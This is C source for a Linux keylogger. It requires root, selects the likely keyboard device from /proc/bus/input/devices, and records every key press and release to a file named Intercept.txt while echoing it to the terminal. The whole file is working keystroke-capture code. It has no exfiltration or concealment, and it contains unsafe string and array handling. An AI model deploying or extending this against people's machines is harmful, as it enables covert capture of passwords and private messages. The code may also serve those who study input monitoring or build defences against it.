#include <linux/input.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <ctype.h>

char* determine_input_device();
void set_signal_handling();
char* execute(char* cmd);
char** setup_keys(char** keys);

FILE *out;

struct KeyboardScore {
    char path[100];
    unsigned short score;
};

int main(int argc, char **argv) {
    struct input_event event;

    uid_t gid = getegid();
    uid_t uid = geteuid();
    if (gid != 0 || uid != 0) {
        fprintf(stderr, "This must be run as root\n");
        return EXIT_FAILURE;
    }

    out = fopen("Intercept.txt","w+");
    if (out == NULL) {
        fprintf(stderr, "Unable to open output file\n");
        return EXIT_FAILURE;
    }
    struct KeyboardScore scores[20];
    char* input_device = determine_input_device(scores);
    int keyboard_fd = open(input_device, O_RDONLY);
    set_signal_handling();

    char* keys[255];
    setup_keys(keys);

    int i = 0;
    int insert_new_line = 30;

    while (read(keyboard_fd, &event, sizeof(event)) > 0) {
        if (event.type != EV_KEY) {
            continue;
        }
        if (event.value == 0) {
            fprintf(out, "↑");
        } else {
            fprintf(out, "↓");
        }
        fprintf(out,"%s",keys[event.code]);
        printf("%s",keys[event.code]);
        if (++i == insert_new_line) {
            i = 0;
            fprintf(out,"\n");
        }
    }
    fclose(out);
    return 0;
}

char** setup_keys(char** keys) {
    // see https://github.com/torvalds/linux/blob/master/include/uapi/linux/input-event-codes.h

    keys[KEY_RESERVED] = "<RESERVED>";
    keys[KEY_ESC] = "<ESC>";
    keys[KEY_1] = "1";
    keys[KEY_2] = "2";
    keys[KEY_3] = "3";
    keys[KEY_4] = "4";
    keys[KEY_5] = "5";
    keys[KEY_6] = "6";
    keys[KEY_7] = "7";
    keys[KEY_8] = "8";
    keys[KEY_9] = "9";
    keys[KEY_0] = "0";
    keys[KEY_MINUS] = "-";
    keys[KEY_EQUAL] = "=";
    keys[KEY_BACKSPACE] = "<BKSPCE>";
    keys[KEY_TAB] = "<TAB>";
    keys[KEY_Q] = "q";
    keys[KEY_W] = "w";
    keys[KEY_E] = "e";
    keys[KEY_R] = "r";
    keys[KEY_T] = "t";
    keys[KEY_Y] = "y";
    keys[KEY_U] = "u";
    keys[KEY_I] = "i";
    keys[KEY_O] = "o";
    keys[KEY_P] = "p";
    keys[KEY_LEFTBRACE] = "{";
    keys[KEY_RIGHTBRACE] = "}";
    keys[KEY_ENTER] = "<ENTER>";
    keys[KEY_LEFTCTRL] = "<L CTRL>";
    keys[KEY_A] = "a";
    keys[KEY_S] = "s";
    keys[KEY_D] = "d";
    keys[KEY_F] = "f";
    keys[KEY_G] = "g";
    keys[KEY_H] = "h";
    keys[KEY_J] = "j";
    keys[KEY_K] = "k";
    keys[KEY_L] = "l";
    keys[KEY_SEMICOLON] = ";";
    keys[KEY_APOSTROPHE] = "'";
    keys[KEY_GRAVE] = "`";
    keys[KEY_LEFTSHIFT] = "<L SHIFT>";
    keys[KEY_BACKSLASH] = "\\";
    keys[KEY_Z] = "z";
    keys[KEY_X] = "x";
    keys[KEY_C] = "c";
    keys[KEY_V] = "v";
    keys[KEY_B] = "b";
    keys[KEY_N] = "n";
    keys[KEY_M] = "m";
    keys[KEY_COMMA] = ",";
    keys[KEY_DOT] = ".";
    keys[KEY_SLASH] = "/";
    keys[KEY_RIGHTSHIFT] = "<R SHIFT>";
    keys[KEY_KPASTERISK] = "*";
    keys[KEY_LEFTALT] = "<L ALT>";
    keys[KEY_SPACE] = " ";
    keys[KEY_CAPSLOCK] = "<CAPS LOCK>";
    keys[KEY_F1] = "<F1>";
    keys[KEY_F2] = "<F2>";
    keys[KEY_F3] = "<F3>";
    keys[KEY_F4] = "<F4>";
    keys[KEY_F5] = "<F5>";
    keys[KEY_F6] = "<F6>";
    keys[KEY_F7] = "<F7>";
    keys[KEY_F8] = "<F8>";
    keys[KEY_F9] = "<F9>";
    keys[KEY_F10] = "<F10>";
    keys[KEY_NUMLOCK] = "<NUM LOCK>";
    keys[KEY_SCROLLLOCK] = "<SCRL LOCK>";
    keys[KEY_KP7] = "7";
    keys[KEY_KP8] = "8";
    keys[KEY_KP9] = "9";
    keys[KEY_KPMINUS] = "-";
    keys[KEY_KP4] = "4";
    keys[KEY_KP5] = "5";
    keys[KEY_KP6] = "6";
    keys[KEY_KPPLUS] = "+";
    keys[KEY_KP1] = "1";
    keys[KEY_KP2] = "2";
    keys[KEY_KP3] = "3";
    keys[KEY_KP0] = "0";
    keys[KEY_KPDOT] = ".";

    keys[KEY_ZENKAKUHANKAKU] = "<ZENKAKUHANKAKU>";
    keys[KEY_102ND] = "<102ND>";
    keys[KEY_F11] = "F11";
    keys[KEY_F12] = "F12";
    keys[KEY_RO] = "<RO>";
    keys[KEY_KATAKANA] = "<KATKANA>";
    keys[KEY_HIRAGANA] = "<HIRAGANA>";
    keys[KEY_HENKAN] = "<HENKAN>";
    keys[KEY_KATAKANAHIRAGANA] = "<KATAKANAHIRAGANA>";
    keys[KEY_MUHENKAN] = "<MUHENKAN>";
    keys[KEY_KPJPCOMMA] = "<KPJPCOMMA>";
    keys[KEY_KPENTER] = "<ENTER>";
    keys[KEY_RIGHTCTRL] = "<R CNTL>";
    keys[KEY_KPSLASH] = "/";
    keys[KEY_SYSRQ] = "<SYS REQ>";
    keys[KEY_RIGHTALT] = "<R ALT>";
    keys[KEY_LINEFEED] = "<LINEFEED>";
    keys[KEY_HOME] = "<HOME>";
    keys[KEY_UP] = "<UP>";
    keys[KEY_PAGEUP] = "<PG UP>";
    keys[KEY_LEFT] = "<L ARROW>";
    keys[KEY_RIGHT] = "<R ARROW>";
    keys[KEY_END] = "<END>";
    keys[KEY_DOWN] = "<D ARROW>";
    keys[KEY_PAGEDOWN] = "<PG DOWN>";
    keys[KEY_INSERT] = "<INSERT>";
    keys[KEY_DELETE] = "<DEL>";
    keys[KEY_MACRO] = "<MACRO>";
    keys[KEY_MUTE] = "<MUTE>";
    keys[KEY_VOLUMEDOWN] = "<VOL DOWN>";
    keys[KEY_VOLUMEUP] = "<VOL UP>";
    keys[KEY_POWER] = "<PWR>";
    keys[KEY_KPEQUAL] = "=";
    keys[KEY_KPPLUSMINUS] = "<+->";
    keys[KEY_PAUSE] = "<PAUSE>";
    keys[KEY_SCALE] = "<SCALE>";

    keys[KEY_KPCOMMA] = ",";
    keys[KEY_HANGEUL] = "<HANGEUL>";
    keys[KEY_HANJA] = "<HANJA>";
    keys[KEY_YEN] = "<YEN>";
    keys[KEY_LEFTMETA] = "<L META>";
    keys[KEY_RIGHTMETA] = "<R META>";
    keys[KEY_COMPOSE] = "<COMPOSE>";

    keys[KEY_STOP] = "<STOP>";
    keys[KEY_AGAIN] = "<AGAIN>";
    keys[KEY_PROPS] = "<PROPS>";
    keys[KEY_UNDO] = "<UNDO>";
    keys[KEY_FRONT] = "<FRONT>";
    keys[KEY_COPY] = "<COPY>";
    keys[KEY_OPEN] = "<OPEN>";
    keys[KEY_PASTE] = "<PASTE>";
    keys[KEY_FIND] = "<FIND>";
    keys[KEY_CUT] = "<CUT>";
    keys[KEY_HELP] = "<HELP>";
    keys[KEY_MENU] = "<MENU>";
    keys[KEY_CALC] = "<CALC>";
    keys[KEY_SETUP] = "<SETUP>";
    keys[KEY_SLEEP] = "<SLEEP>";
    keys[KEY_WAKEUP] = "<WAKEUP>";
    keys[KEY_FILE] = "<FILE>";
    keys[KEY_SENDFILE] = "<SENDFILE>";
    keys[KEY_DELETEFILE] = "<DELETEFILE>";
    keys[KEY_XFER] = "<XFER>";
    keys[KEY_PROG1] = "<PROG1>";
    keys[KEY_PROG2] = "<PROG2>";
    keys[KEY_WWW] = "<WWW>";
    keys[KEY_MSDOS] = "<MSDOS>";
    keys[KEY_COFFEE] = "<COFFEE>";
    keys[KEY_SCREENLOCK] = "<SCREEN LOCK>";
    keys[KEY_ROTATE_DISPLAY] = "<ROT DISPLAY>";
    keys[KEY_DIRECTION] = "<DIRECTION>";
    keys[KEY_CYCLEWINDOWS] = "<CYCLEWINDOWS>";
    keys[KEY_MAIL] = "<MAIL>";
    keys[KEY_BOOKMARKS] = "<BOOKMARKS>";
    keys[KEY_COMPUTER] = "<COMPUTER>";
    keys[KEY_BACK] = "<BACK>";
    keys[KEY_FORWARD] = "<FORWARD>";
    keys[KEY_CLOSECD] = "<CLOSE CD>";
    keys[KEY_EJECTCD] = "<EJECT CD>";
    keys[KEY_EJECTCLOSECD] = "<CLOSE EJECT CD>";
    keys[KEY_NEXTSONG] = "<NEXT SONG>";
    keys[KEY_PLAYPAUSE] = "<PLAY PAUSE>";
    keys[KEY_PREVIOUSSONG] = "<PREVIOUS SONG>";
    keys[KEY_STOPCD] = "<STOP CD>";
    keys[KEY_RECORD] = "<RECORD>";
    keys[KEY_REWIND] = "<REWIND>";
    keys[KEY_PHONE] = "<PHONE>";
    keys[KEY_ISO] = "<ISO>";
    keys[KEY_CONFIG] = "<CONFIG>";
    keys[KEY_HOMEPAGE] = "<HOMEPAGE>";
    keys[KEY_REFRESH] = "<REFRESH>";
    keys[KEY_EXIT] = "<EXIT>";
    keys[KEY_MOVE] = "<MOVE>";
    keys[KEY_EDIT] = "<EDIT>";
    keys[KEY_SCROLLUP] = "<SCRL UP>";
    keys[KEY_SCROLLDOWN] = "<SCRL DOWN>";
    keys[KEY_KPLEFTPAREN] = "(";
    keys[KEY_KPRIGHTPAREN] = ")";
    keys[KEY_NEW] = "<NEW>";
    keys[KEY_REDO] = "<REDO>";

    keys[KEY_F13] = "<F13>";
    keys[KEY_F14] = "<F14>";
    keys[KEY_F15] = "<F15>";
    keys[KEY_F16] = "<F16>";
    keys[KEY_F17] = "<F17>";
    keys[KEY_F18] = "<F18>";
    keys[KEY_F19] = "<F19>";
    keys[KEY_F20] = "<F20>";
    keys[KEY_F21] = "<F21>";
    keys[KEY_F22] = "<F22>";
    keys[KEY_F23] = "<F23>";
    keys[KEY_F24] = "<F24>";

    keys[KEY_PLAYCD] = "<PLAY CD>";
    keys[KEY_PAUSECD] = "<PAUSE CD>";
    keys[KEY_PROG3] = "<PROG 3>";
    keys[KEY_PROG4] = "<PROG 4>";
    keys[KEY_DASHBOARD] = "<DASHBOARD>";
    keys[KEY_SUSPEND] = "<SUSPEND>";
    keys[KEY_CLOSE] = "<CLOSE>";
    keys[KEY_PLAY] = "<PLAY>";
    keys[KEY_FASTFORWARD] = "<FASTFORWARD>";
    keys[KEY_BASSBOOST] = "<BASSBOOST>";
    keys[KEY_PRINT] = "<PRINT>";
    keys[KEY_HP] = "<HP>";
    keys[KEY_CAMERA] = "<CAMERA>";
    keys[KEY_SOUND] = "<SOUND>";
    keys[KEY_QUESTION] = "<QUESTION>";
    keys[KEY_EMAIL] = "<EMAIL>";
    keys[KEY_CHAT] = "<CHAT>";
    keys[KEY_SEARCH] = "<SEARCH>";
    keys[KEY_CONNECT] = "<CONNECT>";
    keys[KEY_FINANCE] = "<FINANCE>";
    keys[KEY_SPORT] = "<SPORT>";
    keys[KEY_SHOP] = "<SHOP>";
    keys[KEY_ALTERASE] = "<ALT ERASE>";
    keys[KEY_CANCEL] = "<CANCEL>";
    keys[KEY_BRIGHTNESSDOWN] = "<BRIGHTNESS DOWN>";
    keys[KEY_BRIGHTNESSUP] = "<BRIGHTNESS UP>";
    keys[KEY_MEDIA] = "<MEDIA>";

    return keys;
}

void signal_handler(int signal) {
    fclose(out);
}

void set_signal_handling()
{
  struct sigaction act = {{0}};
  act.sa_handler = signal_handler;
  sigaction(SIGHUP,  &act, NULL);
  sigaction(SIGINT,  &act, NULL);
  sigaction(SIGTERM, &act, NULL);
  // prevent child processes from becoming zombies
  act.sa_handler = SIG_IGN;
  sigaction(SIGCHLD, &act, NULL);
}

// executes cmd and returns string ouput
char* execute(char* cmd)
{
    FILE* pipe = popen(cmd, "r");
    if (!pipe) {
        return "";
    }
    char buffer[128];
    char* result;
    int result_size = 128;
    result = (char *) malloc(result_size);
    while(!feof(pipe)) {
    	if(fgets(buffer, 128, pipe) != NULL) {
            result_size += 128;
            result = (char *) realloc(result, result_size);
            strcat(result, buffer);
        }
    }
    pclose(pipe);
    return result;
}


// taken from https://github.com/kernc/logkeys/blob/master/src/logkeys.cc
char* determine_input_device(struct KeyboardScore* scores) {
    uid_t gid = getegid();
    uid_t uid = geteuid();
    // switch to nobody
    setegid(65534);
    seteuid(65534);

    //Look for devices with keybit bitmask that has keys a keyboard doeas
    //If a bitmask ends with 'e', it supports KEY_2, KEY_1, KEY_ESC, and KEY_RESERVED is set to 0, so it's probably a keyboard
    //keybit:     https://github.com/torvalds/linux/blob/02de58b24d2e1b2cf947d57205bd2221d897193c/include/linux/input.h#L45
    //keycodes: https://github.com/torvalds/linux/blob/139711f033f636cc78b6aaf7363252241b9698ef/include/uapi/linux/input-event-codes.h#L75
    //Take the Name, Handlers, and KEY values
    char* cmd = "/bin/grep -B8 -E 'KEY=.*e$' /proc/bus/input/devices | /bin/grep -E 'Name|Handlers|KEY'";
    char* output = execute(cmd);


    //setup
    unsigned short line_type = 0;

    int i = 0;

    char *token;
    const char s[2] = "\n";
    token = strtok(output, s);

    while ( token != NULL ) {

        struct KeyboardScore keyboardScore;
        keyboardScore.score = 0;

        for (int i = 0; token[i]; i++) {
            token[i] = tolower(token[i]);
        }

        if (strstr(token, "keyboard")) {
            keyboardScore.score += 100;
        }

        token = strtok(NULL, s);
        if (token == NULL) {
            continue;
        }

        char *event_token = strstr(token,"event");
        if (event_token != NULL) {
            event_token += 5;
        }
        if (event_token - token < strlen(token)) {
            int index = atoi(event_token);

            if (index != -1) {
                strcpy(keyboardScore.path, "/dev/input/");
                strcat(keyboardScore.path, "event");

                char* event_trim = strchr(event_token, ' ');
                strncat(keyboardScore.path, event_token, event_trim - event_token);
            }
        }

        //Generate score based on size of key bitmask
        token = strtok(NULL, s);
        if (token == NULL) {
            continue;
        }
        char* substr = strstr(token, "=");
        substr++;
        keyboardScore.score += strlen(substr);
        scores[i] = keyboardScore;
        i++;

        token = strtok(NULL, s);
    }
    unsigned short max_score = scores[0].score;
    unsigned int max_score_index = 0;
    for (int j = 1; j < i; j++) {
        if (scores[j].score > max_score) {
            max_score = scores[j].score;
            max_score_index = j;
        }
    }

    setegid(gid);
    seteuid(uid);
    return scores[max_score_index].path;
}
